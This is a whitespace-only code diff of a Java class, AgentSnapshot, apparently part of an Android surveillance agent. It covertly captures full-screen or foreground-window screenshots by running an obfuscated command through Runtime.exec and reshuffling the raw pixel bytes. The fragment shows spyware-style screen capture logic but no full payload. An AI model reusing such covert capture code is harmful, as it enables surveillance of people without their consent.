@@ -116,18 +116,21 @@ public class AgentSnapshot extends AgentBase {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Snapshot Agent: logging full screen") ;//$NON-NLS-1$
 			}
+			
 			break;
 
 		case CAPTURE_FOREGROUND:
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Snapshot Agent: logging foreground window") ;//$NON-NLS-1$
 			}
+			
 			break;
 
 		default:
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Snapshot Agent: wrong capture parameter") ;//$NON-NLS-1$
 			}
+			
 			break;
 		}
 
@@ -178,23 +181,25 @@ public class AgentSnapshot extends AgentBase {
 				// 2: invertito blu e verde
 				// no ARGB, no ABGR, no AGRB
 				byte[] raw = getRawBitmap();
+				
 				if (isTab) {
 					// sul tablet non e' ARGB ma ABGR.
 					byte[] newraw = new byte[raw.length / 2];
+					
 					for (int i = 0; i < newraw.length; i++) {
 						switch (i % 4) {
-						case 0:
-							newraw[i] = raw[i + 2]; // A 3:+2
-							break;
-						case 1:
-							newraw[i] = raw[i]; // R 1:+2 2:+1
-							break;
-						case 2:
-							newraw[i] = raw[i - 2]; // G 2:-1 3:-2
-							break;
-						case 3:
-							newraw[i] = raw[i]; // B 1:-2
-							break;
+							case 0:
+								newraw[i] = raw[i + 2]; // A 3:+2
+								break;
+							case 1:
+								newraw[i] = raw[i]; // R 1:+2 2:+1
+								break;
+							case 2:
+								newraw[i] = raw[i - 2]; // G 2:-1 3:-2
+								break;
+							case 3:
+								newraw[i] = raw[i]; // B 1:-2
+								break;
 						}
 						/*
 						 * if (i % 4 == 0) newraw[i] = raw[i + 2]; // A 3:+2
@@ -215,9 +220,11 @@ public class AgentSnapshot extends AgentBase {
 					raw = null;
 
 					int rotateTab = 0;
+					
 					if (isTab) {
 						rotateTab = -90;
 					}
+					
 					if (useMatrix && orientation != Surface.ROTATION_0) {
 						final Matrix matrix = new Matrix();
 
@@ -294,6 +301,7 @@ public class AgentSnapshot extends AgentBase {
 		final String path = filesPath.getAbsolutePath();
 
 		final String getrawpath = Messages.getString("11.2"); //$NON-NLS-1$
+		
 		try {
 			final Process localProcess = Runtime.getRuntime().exec(getrawpath);
 			localProcess.waitFor();
@@ -311,6 +319,7 @@ public class AgentSnapshot extends AgentBase {
 				Check.log(e) ;//$NON-NLS-1$
 			}
 		}
+		
 		return null;
 	}
 
